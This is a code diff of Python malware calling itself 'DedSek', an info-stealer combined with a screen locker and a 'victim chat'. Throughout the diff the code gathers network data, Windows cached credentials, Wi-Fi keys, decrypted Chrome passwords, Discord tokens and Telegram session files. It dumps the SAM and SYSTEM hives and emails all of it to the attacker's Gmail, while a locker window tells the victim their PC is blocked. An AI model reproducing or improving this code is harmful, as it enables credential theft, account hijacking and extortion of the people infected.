@@ -87,12 +87,11 @@ def mega_steal_data():
         full_report.append("DedSek MEGA STEALER REPORT")
         full_report.append("=" * 60)
         
-        full_report.append("\n--- БАЗОВАЯ ИНФОРМАЦИЯ ---")
-        full_report.append(f"Пользователь: {os.environ.get('USERNAME', 'Unknown')}")
-        full_report.append(f"Компьютер: {socket.gethostname()}")
-        full_report.append(f"Папка: {os.environ.get('USERPROFILE', 'Unknown')}")
+        full_report.append("\n--- BAZOVAYA INFORMACIYA ---")
+        full_report.append(f"Polzovatel: {os.environ.get('USERNAME', 'Unknown')}")
+        full_report.append(f"Kompyuter: {socket.gethostname()}")
+        full_report.append(f"Papka: {os.environ.get('USERPROFILE', 'Unknown')}")
         
-        # IPCONFIG - фикс кодировки
         full_report.append("\n--- IPCONFIG /ALL ---")
         try:
             ipconfig = subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL)
@@ -102,57 +101,52 @@ def mega_steal_data():
                 ipconfig_text = ipconfig.decode('cp866', errors='replace')
             full_report.append(ipconfig_text[:5000])
         except:
-            full_report.append("Ошибка ipconfig")
+            full_report.append("Oshibka ipconfig")
         
-        # IP адреса
-        full_report.append("\n--- IP АДРЕСА ---")
+        full_report.append("\n--- IP ADRESA ---")
         try:
             local_ip = socket.gethostbyname(socket.gethostname())
-            full_report.append(f"Локальный IP: {local_ip}")
+            full_report.append(f"Lokalniy IP: {local_ip}")
         except:
             pass
         
         try:
             public_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
-            full_report.append(f"Внешний IP: {public_ip}")
+            full_report.append(f"Vneshniy IP: {public_ip}")
         except:
             public_ip = "Unknown"
         
         try:
             geo = urllib.request.urlopen(f"http://ip-api.com/json/{public_ip}", timeout=5).read().decode()
             geo_json = json.loads(geo)
-            full_report.append(f"Страна: {geo_json.get('country', 'Unknown')}")
-            full_report.append(f"Город: {geo_json.get('city', 'Unknown')}")
-            full_report.append(f"Провайдер: {geo_json.get('isp', 'Unknown')}")
+            full_report.append(f"Strana: {geo_json.get('country', 'Unknown')}")
+            full_report.append(f"Gorod: {geo_json.get('city', 'Unknown')}")
+            full_report.append(f"Provayder: {geo_json.get('isp', 'Unknown')}")
         except:
             pass
         
-        # ARP таблица
-        full_report.append("\n--- ARP ТАБЛИЦА ---")
+        full_report.append("\n--- ARP TABLICA ---")
         try:
             arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL)
             full_report.append(arp.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        # DNS кэш
-        full_report.append("\n--- DNS КЭШ ---")
+        full_report.append("\n--- DNS KESH ---")
         try:
             dns = subprocess.check_output("ipconfig /displaydns", shell=True, stderr=subprocess.DEVNULL)
             full_report.append(dns.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        # Активные соединения
-        full_report.append("\n--- АКТИВНЫЕ СОЕДИНЕНИЯ ---")
+        full_report.append("\n--- AKTIVNIE SOEDINENIYA ---")
         try:
             netstat = subprocess.check_output("netstat -ano", shell=True, stderr=subprocess.DEVNULL)
             full_report.append(netstat.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        # Кэш паролей - фикс кодировки
-        full_report.append("\n--- КЭШ ПАРОЛЕЙ WINDOWS ---")
+        full_report.append("\n--- KESH PAROLEY WINDOWS ---")
         try:
             cmdkey = subprocess.check_output("cmdkey /list", shell=True, stderr=subprocess.DEVNULL)
             try:
@@ -160,31 +154,27 @@ def mega_steal_data():
             except:
                 cmdkey_text = cmdkey.decode('cp866', errors='replace')
             
-            # Очистка от кракозябр
             clean_lines = []
             for line in cmdkey_text.split('\n'):
                 line = line.strip()
                 if line and len(line) > 2:
-                    # Заменяем непонятные символы
-                    line = line.replace('騥', 'Цель:').replace('࠭', 'Сохранено').replace('䠩', 'Цель:')
-                    line = line.replace('ᠫ', 'Тип:').replace('짮⥫', 'Пользователь:')
-                    line = line.replace('室', 'Да').replace('쭮', 'Нет')
-                    line = line.replace('ꭧ', 'Локально').replace('⮣', 'сеанса')
+                    line = line.replace('Target:', 'Cel:').replace('Type:', 'Tip:')
+                    line = line.replace('User:', 'Polzovatel:').replace('Saved for this logon only', 'Sohraneno')
+                    line = line.replace('Local machine persistence', 'Lokalno')
                     clean_lines.append(line)
             
             full_report.append('\n'.join(clean_lines)[:3000])
         except:
-            full_report.append("Ошибка cmdkey")
+            full_report.append("Oshibka cmdkey")
         
-        # WiFi пароли - фикс
-        full_report.append("\n--- WIFI ПАРОЛИ ---")
+        full_report.append("\n--- WIFI PAROLI ---")
         try:
             wifi_output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL)
             wifi_text = wifi_output.decode('cp866', errors='replace')
             
             profiles = []
             for line in wifi_text.split('\n'):
-                if ':' in line and ('Все профили' in line or 'All User' in line):
+                if ':' in line and ('Vse profili' in line or 'All User' in line):
                     profile = line.split(':')[1].strip()
                     if profile:
                         profiles.append(profile)
@@ -194,20 +184,19 @@ def mega_steal_data():
                     wifi_pass = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, stderr=subprocess.DEVNULL)
                     wifi_pass_text = wifi_pass.decode('cp866', errors='replace')
                     
-                    key = "Не найден"
+                    key = "Ne nayden"
                     for pline in wifi_pass_text.split('\n'):
-                        if 'Содержимое ключа' in pline or 'Key Content' in pline:
+                        if 'Soderzhimoe klucha' in pline or 'Key Content' in pline:
                             key = pline.split(':')[1].strip()
                             break
                     
-                    full_report.append(f"WiFi: {profile} | Пароль: {key}")
+                    full_report.append(f"WiFi: {profile} | Parol: {key}")
                 except:
-                    full_report.append(f"WiFi: {profile} | Ошибка")
+                    full_report.append(f"WiFi: {profile} | Oshibka")
         except:
-            full_report.append("Ошибка WiFi")
+            full_report.append("Oshibka WiFi")
         
-        # Chrome пароли с расшифровкой
-        full_report.append("\n--- CHROME ПАРОЛИ ---")
+        full_report.append("\n--- CHROME PAROLI ---")
         try:
             chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
             if os.path.exists(chrome_path):
@@ -222,78 +211,66 @@ def mega_steal_data():
                     username = row[1]
                     try:
                         password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8', errors='ignore')
-                        full_report.append(f"САЙТ: {url}")
-                        full_report.append(f"ЛОГИН: {username}")
-                        full_report.append(f"ПАРОЛЬ: {password}")
+                        full_report.append(f"SAYT: {url}")
+                        full_report.append(f"LOGIN: {username}")
+                        full_report.append(f"PAROL: {password}")
                         full_report.append("-" * 30)
                     except:
-                        full_report.append(f"САЙТ: {url} | ЛОГИН: {username} | ПАРОЛЬ: [ошибка расшифровки]")
+                        full_report.append(f"SAYT: {url} | LOGIN: {username} | PAROL: [oshibka]")
                 
                 conn.close()
                 try:
                     os.remove(temp_db)
                 except:
                     pass
-            else:
-                full_report.append("Chrome не найден")
-        except Exception as e:
-            full_report.append(f"Ошибка Chrome: {str(e)}")
+        except:
+            full_report.append("Oshibka Chrome")
         
-        # Системная информация
-        full_report.append("\n--- СИСТЕМНАЯ ИНФОРМАЦИЯ ---")
+        full_report.append("\n--- SISTEMNAYA INFORMACIYA ---")
         try:
             sysinfo = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL)
             full_report.append(sysinfo.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        # Процессы
-        full_report.append("\n--- ЗАПУЩЕННЫЕ ПРОЦЕССЫ ---")
+        full_report.append("\n--- ZAPUSHENNIE PROCESSI ---")
         try:
             tasklist = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL)
             full_report.append(tasklist.decode('cp866', errors='replace')[:3000])
         except:
             pass
         
-        # Программы
-        full_report.append("\n--- УСТАНОВЛЕННЫЕ ПРОГРАММЫ ---")
-        try:
-            programs = subprocess.check_output("wmic product get name,version", shell=True, stderr=subprocess.DEVNULL)
-            full_report.append(programs.decode('cp866', errors='replace')[:2000])
-        except:
-            pass
-        
-        # Telegram
         full_report.append("\n--- TELEGRAM ---")
         try:
             tg_path = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
             if os.path.exists(tg_path):
-                full_report.append("Telegram найден!")
-                # Копируем сессию
+                full_report.append("Telegram nayden!")
                 try:
                     tg_zip_path = os.path.join(tempfile.gettempdir(), 'telegram_session.zip')
                     with zipfile.ZipFile(tg_zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                         for root, dirs, files in os.walk(tg_path):
                             for file in files:
-                                file_path = os.path.join(root, file)
-                                arcname = os.path.relpath(file_path, tg_path)
-                                zf.write(file_path, arcname)
+                                if file in ['key_datas', 'D877F783D5D3EF8C', 'settingss', 'maps'] or file.startswith('usertag') or file.startswith('data'):
+                                    file_path = os.path.join(root, file)
+                                    arcname = os.path.relpath(file_path, tg_path)
+                                    try:
+                                        zf.write(file_path, arcname)
+                                    except:
+                                        pass
                     
-                    # Отправляем файл
                     send_file_email(tg_zip_path, "Telegram Session")
-                    full_report.append("Сессия Telegram отправлена на почту!")
+                    full_report.append("Sessiya Telegram otpravlena na pochtu!")
                     
                     try:
                         os.remove(tg_zip_path)
                     except:
                         pass
                 except:
-                    full_report.append("Не удалось скопировать сессию")
+                    full_report.append("Ne udalos skopirovat sessiyu")
         except:
-            full_report.append("Telegram не найден")
+            full_report.append("Telegram ne nayden")
         
-        # Discord токены
-        full_report.append("\n--- DISCORD ТОКЕНЫ ---")
+        full_report.append("\n--- DISCORD TOKENI ---")
         try:
             discord_path = os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb')
             if os.path.exists(discord_path):
@@ -304,9 +281,7 @@ def mega_steal_data():
                             file_path = os.path.join(discord_path, file)
                             with open(file_path, 'r', errors='ignore') as f:
                                 content = f.read()
-                                # Ищем токены
                                 import re
-                                # Паттерн для Discord токена
                                 token_pattern = r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}'
                                 found_tokens = re.findall(token_pattern, content)
                                 for token in found_tokens:
@@ -317,16 +292,15 @@ def mega_steal_data():
                 
                 if tokens_found:
                     for token in tokens_found[:10]:
-                        full_report.append(f"ТОКЕН: {token}")
+                        full_report.append(f"TOKEN: {token}")
                 else:
-                    full_report.append("Токены не найдены в файлах")
+                    full_report.append("Tokeni ne naydeni")
             else:
-                full_report.append("Discord не найден")
-        except Exception as e:
-            full_report.append(f"Ошибка Discord: {str(e)}")
+                full_report.append("Discord ne nayden")
+        except:
+            full_report.append("Oshibka Discord")
         
-        # Пароль Windows (хэш)
-        full_report.append("\n--- ХЭШ ПАРОЛЯ WINDOWS ---")
+        full_report.append("\n--- HESH PAROLYA WINDOWS ---")
         try:
             os.system('reg save HKLM\\SAM "%TEMP%\\sam" /y >nul 2>&1')
             os.system('reg save HKLM\\SYSTEM "%TEMP%\\system" /y >nul 2>&1')
@@ -335,15 +309,14 @@ def mega_steal_data():
             sys_path = os.path.join(os.environ['TEMP'], 'system')
             
             if os.path.exists(sam_path) and os.path.exists(sys_path):
-                # Создаём архив с SAM и SYSTEM
                 hash_zip = os.path.join(tempfile.gettempdir(), 'windows_hashes.zip')
                 with zipfile.ZipFile(hash_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
                     zf.write(sam_path, 'sam')
                     zf.write(sys_path, 'system')
                 
                 send_file_email(hash_zip, "Windows Password Hashes")
-                full_report.append("Хэши паролей отправлены на почту!")
-                full_report.append("Расшифруй через hashcat: hashcat -m 1000 sam system")
+                full_report.append("Heshi paroley otpravleni na pochtu!")
+                full_report.append("Rasshifruy cherez hashcat: hashcat -m 1000 sam system")
                 
                 try:
                     os.remove(hash_zip)
@@ -352,18 +325,16 @@ def mega_steal_data():
                 except:
                     pass
             else:
-                full_report.append("Нет прав для дампа SAM (нужен запуск от админа)")
+                full_report.append("Net prav dlya dumpa SAM (nuzhen zapusk ot admina)")
         except:
-            full_report.append("Ошибка дампа SAM (нужен админ)")
+            full_report.append("Oshibka dumpa SAM (nuzhen admin)")
         
         full_report.append("\n" + "=" * 60)
-        full_report.append(f"ОТЧЁТ СОЗДАН: {time.strftime('%d.%m.%Y %H:%M:%S')}")
+        full_report.append(f"OTCHET SOZDAN: {time.strftime('%d.%m.%Y %H:%M:%S')}")
         full_report.append("=" * 60)
         
-        # Отправляем отчёт
         report_text = '\n'.join(full_report)
         
-        # Разбиваем на части если большой
         max_size = 15000
         parts = [report_text[i:i+max_size] for i in range(0, len(report_text), max_size)]
         
@@ -371,7 +342,7 @@ def mega_steal_data():
             send_email(part, subject=f"DedSek MEGA REPORT [{i+1}/{len(parts)}]")
         
     except Exception as e:
-        send_email(f"Ошибка стилера: {str(e)}")
+        send_email(f"Oshibka stilera: {str(e)}")
 
 def send_email(message, subject=None):
     try:
@@ -392,7 +363,7 @@ def send_email(message, subject=None):
 def send_file_email(file_path, description):
     try:
         msg = MIMEMultipart()
-        msg['Subject'] = f'Файл: {description} - {os.environ.get("USERNAME", "Unknown")}'
+        msg['Subject'] = f'File: {description} - {os.environ.get("USERNAME", "Unknown")}'
         msg['From'] = GMAIL_LOGIN
         msg['To'] = RECEIVER_EMAIL
         
@@ -477,13 +448,15 @@ class VictimChat:
         self.chat_window = None
         
     def show(self):
+        if self.chat_window:
+            return
+            
         self.chat_window = tk.Toplevel(self.locker.win)
-        self.chat_window.geometry("400x500+50+50")
+        self.chat_window.geometry("380x480+60+60")
         self.chat_window.configure(bg='#00FF00')
         self.chat_window.attributes('-topmost', True)
         self.chat_window.overrideredirect(True)
         self.chat_window.focus_force()
-        self.chat_window.grab_set()
         
         def keep_on_top():
             while self.chat_window:
@@ -502,12 +475,17 @@ class VictimChat:
         header = tk.Frame(frame, bg='#00FF00')
         header.pack(fill='x')
         
-        tk.Label(header, text="DedSek Messenger", 
+        tk.Label(header, text="DedSek Chat", 
                 bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
+        
+        close_btn = tk.Button(header, text="X", command=self.hide,
+                             bg='#FF0000', fg='white', font=('Courier', 12, 'bold'),
+                             bd=0, width=3, cursor='hand2')
+        close_btn.pack(side='right', padx=5, pady=3)
         
         self.chat_history = scrolledtext.ScrolledText(frame, 
                                                        bg='#0a0a0a', fg='#00FF00',
-                                                       font=('Courier', 10), height=22,
+                                                       font=('Courier', 10), height=20,
                                                        wrap=tk.WORD)
         self.chat_history.pack(padx=10, pady=(0, 5), fill='both', expand=True)
         self.chat_history.config(state='disabled')
@@ -529,7 +507,7 @@ class VictimChat:
         header.bind('<Button-1>', self.start_drag)
         header.bind('<B1-Motion>', self.drag)
         
-        self.add_message("DedSek", "Привет! Я DedSek. Твой Windows заблокирован.")
+        self.add_message("DedSek", "Privet! TVOY PK ZABLOKIROVAN.")
         self.check_incoming_messages()
     
     def start_drag(self, event):
@@ -545,12 +523,19 @@ class VictimChat:
         self.x = event.x_root
         self.y = event.y_root
     
+    def hide(self):
+        if self.chat_window:
+            self.chat_window.destroy()
+            self.chat_window = None
+        self.locker.win.focus_force()
+        self.locker.entry.focus_force()
+    
     def send_message(self, event=None):
         msg = self.msg_entry.get().strip()
         if msg:
             self.add_message("You", msg)
             self.msg_entry.delete(0, tk.END)
-            send_email(f"Message from victim:\n\n{msg}")
+            send_email(f"Soobshenie ot zhertvy:\n\n{msg}")
     
     def add_message(self, sender, msg):
         self.chat_history.config(state='normal')
@@ -561,6 +546,8 @@ class VictimChat:
     def check_incoming_messages(self):
         def check():
             while True:
+                if not self.chat_window:
+                    break
                 try:
                     mail = imaplib.IMAP4_SSL('imap.gmail.com')
                     mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
@@ -578,10 +565,8 @@ class VictimChat:
                                     if part.get_content_type() == "text/plain":
                                         command = part.get_payload(decode=True).decode()
                                         if command.startswith("MSG:"):
-                                            try:
+                                            if self.chat_window:
                                                 self.chat_window.after(0, self.add_message, "DedSek", command[4:])
-                                            except:
-                                                pass
                                         
                             mail.store(num, '+FLAGS', '\\Seen')
                     
@@ -859,9 +844,21 @@ UDACHI, DRUG. U TEBYA {MAX_ATTEMPTS} POPYTKI!"""
                            font=('Courier', 9, 'bold'), justify='left')
         lbl_msg.place(relx=0.5, rely=0.42, anchor='center')
         
+        # Кнопка чата
         self.chat = VictimChat(self)
-        self.win.after(500, self.chat.show)
+        self.chat_open = False
         
+        chat_frame = tk.Frame(self.win, bg='black')
+        chat_frame.place(relx=0.95, rely=0.08, anchor='ne')
+        
+        self.chat_btn = tk.Button(chat_frame, text="CHAT", 
+                            command=self.toggle_chat,
+                            bg='#00FF00', fg='black',
+                            font=('Courier', 10, 'bold'),
+                            cursor='hand2', bd=1, width=6)
+        self.chat_btn.pack()
+        
+        # Поле ввода пароля
         center_frame = tk.Frame(self.win, bg='black')
         center_frame.place(relx=0.5, rely=0.82, anchor='center')
         
@@ -881,6 +878,16 @@ UDACHI, DRUG. U TEBYA {MAX_ATTEMPTS} POPYTKI!"""
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_force()
         self.win.after(100, self.keep_focus)
+    
+    def toggle_chat(self):
+        if self.chat_open:
+            self.chat.hide()
+            self.chat_open = False
+            self.chat_btn.config(text="CHAT")
+        else:
+            self.chat.show()
+            self.chat_open = True
+            self.chat_btn.config(text="[X]")
     
     def keep_focus(self):
         try:
